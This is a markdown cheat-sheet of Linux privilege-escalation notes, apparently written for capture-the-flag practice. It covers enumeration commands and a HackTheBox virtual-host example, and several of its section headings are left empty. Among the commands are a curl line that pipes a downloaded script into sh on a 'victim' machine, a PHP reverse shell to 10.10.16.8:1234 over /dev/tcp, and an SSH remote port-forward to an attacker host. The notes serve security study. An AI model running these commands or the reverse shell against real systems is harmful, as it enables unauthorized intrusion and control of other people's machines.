---
sort : 7
---


# Privilege Escalation

A type of network attack used to gain unauthorized access to systems within a security perimeter.

I couldn't find a common path to follow, it's just all about following your intuition ^^.

All we need is some how to get a shell....

## Got A Shell ?? 

`Here are the most important attack vectors to perform :`























### 1. Knowing the compromised users permissions
```bash
$ whoami  

$ id 
```

### 1.1 Kernel Exploits

```bash 
$ uname -a
# OR
$ cat /proc/version
# OR 
$ cat /etc/issue  

```

```warning
Don't use kernel exploits if you can avoid it. If you use it it might crash the machine or put it in an unstable state. 

Always use a simpler priv-esc if you can. They can also produce a lot of stuff in the sys.log. So if you find anything good, put it up on your list and keep searching for other ways before exploiting it.
```



### 2. Privilege Escalation Scripts

```bash 
# On Victime Machine 
$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

some of what the script does is finding : 

#### 1. User Installed Software : 
If you find anything google it for exploits.

```bash
# Common locations for user installed software
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
$ dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```


#### 2. Service only available from inside

It might be that case that the user is running some service that is only available from that host. You can't connect to the service from the outside. It might be a development server, a database, or anything else. 

Check the netstat and compare it with the nmap-scan you did from the outside. Do you find more services available from the inside?

```bash
netstat -anlp
netstat -ano
```






















### 3. Misconfiguration 














### 5. An Expedition into System Files/Folders 

most of the time we gain a `broken shell` as www-data user .. SO .. try to write a php reverse shell file in any writeable folder inside `/var/www/` to get a better shell.
    
```note
`/var/www` is not the only place, it's just where the web server make it's actions.
```

```bash
$ find . -writable -type d
$ echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.8/1234 0>&1'\");" > shell.php  		# escape the double quotes inside a double qoutes ^^ to bypass the overlapping
```



Another case when root is running some writable files ... or even some scripts that uses specific commands which could be manipulated by changing the PATH var.


We could also find some `Unmounted filesystems` 

```bash 
$ lsblk
    NAME   MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
    sda      8:0    0   10G  0 disk 
    ├─sda1   8:1    0  1.3G  0 part /lib/live/mount/persistence/sda1
    └─sda2   8:2    0  8.7G  0 part /lib/live/mount/persistence/sda2
    sdb      8:16   0   10M  0 disk /media/usbstick
    sr0     11:0    1 1024M  0 rom  
    loop0    7:0    0  1.2G  1 loop /lib/live/mount/rootfs/filesystem.squashfslsblk


$ fdisk -l

    Disk /dev/sdb: 10 MiB, 10485760 bytes, 20480 sectors
    Units: sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    Disk /dev/sda: 10 GiB, 10737418240 bytes, 20971520 sectors
    Units: sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
    Disklabel type: dos
    Disk identifier: 0x0eddfb88

    Device     Boot   Start      End  Sectors  Size Id Type
    /dev/sda1  *         64  2709119  2709056  1.3G 17 Hidden HPFS/NTFS
    /dev/sda2       2709504 20971519 18262016  8.7G 83 Linux

    Disk /dev/loop0: 1.2 GiB, 1297825792 bytes, 2534816 sectors
    Units: sectors of 1 * 512 = 512 bytes
    Sector size (logical/physical): 512 bytes / 512 bytes
    I/O size (minimum/optimal): 512 bytes / 512 bytes
```


What if we are looking for a missing/deleted file ?? 
- check out if these is any backup files 
- try to recover some information from disk 

    ```bash
    $ sudo strings /dev/sdb​  
    ```

    Method 2 - Imaging and Recovery

    







### 1. Virtual Hosts

Looking at the `/etc/apache2/sites-enabled/internal.conf` conﬁguration ﬁle reveals that the
internal virtual host is running as joanna on localhost port 52846.


```xml
<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

##### WHat is happenning up there ?? 

	1. even if you changed the /etc/hosts to "10.10.10.171 internal.openadmin.htb" , you sitill won't be able to access the virtual host !! since the bind address with this service is only the loopback ^^ 
	2. so we can access it by port forwarding 
		victim@openadmin $ ssh -R 1337:127.0.0.1:52846 root@10.10.14.2					ssh -R [REMOTE:]REMOTE_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
	3. or by curling locally from the victim machine.